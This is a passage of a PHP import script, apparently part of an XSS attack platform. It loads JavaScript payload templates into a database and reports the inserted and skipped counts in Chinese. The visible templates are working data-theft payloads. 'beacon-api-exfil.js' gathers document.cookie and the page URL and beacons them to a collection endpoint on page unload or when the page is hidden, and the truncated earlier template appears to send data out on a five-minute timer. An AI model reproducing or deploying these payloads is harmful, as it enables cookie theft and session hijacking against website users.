                duration: "5_minutes",
                timestamp: new Date().toISOString()
            })
        });
    }, 300000);
})();'],

            ['beacon-api-exfil.js', '// 使用Beacon API回传数据
(function(){
    const data = {
        type: "beacon",
        cookie: document.cookie,
        url: location.href,
        timestamp: new Date().toISOString()
    };
    
    window.addEventListener("beforeunload", function(){
        navigator.sendBeacon("/api/collect", JSON.stringify(data));
    });
    
    document.addEventListener("visibilitychange", function(){
        if(document.hidden){
            navigator.sendBeacon("/api/collect", JSON.stringify(data));
        }
    });
})();']
        ];
        
        $inserted = 0;
        $skipped = 0;
        $details = [];
        
        foreach ($templates as $template) {
            list($filename, $content) = $template;
            
            // 检查是否已存在
            $checkStmt = $pdo->prepare("SELECT COUNT(*) FROM templates WHERE filename = ?");
            $checkStmt->execute([$filename]);
            
            if ($checkStmt->fetchColumn() > 0) {
                $skipped++;
                $details[] = "跳过: {$filename} (已存在)";
                continue;
            }
            
            // 插入新模板
            $stmt = $pdo->prepare("INSERT INTO templates (filename, content, size) VALUES (?, ?, ?)");
            $stmt->execute([$filename, $content, strlen($content)]);
            
            $inserted++;
            $details[] = "导入: {$filename}";
        }
        
        echo json_encode([
            'success' => true,
            'message' => "成功导入 {$inserted} 个模板，跳过 {$skipped} 个已存在的模板",
            'inserted' => $inserted,
            'skipped' => $skipped,
            'total' => count($templates),
            'details' => $details
        ], JSON_UNESCAPED_UNICODE);
        
    } catch (PDOException $e) {
        echo json_encode([
            'success' => false,
            'message' => '数据库错误: ' . $e->getMessage()
        ], JSON_UNESCAPED_UNICODE);
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => '导入失败: ' . $e->getMessage()
        ], JSON_UNESCAPED_UNICODE);
    }
    
    exit;
}
?>
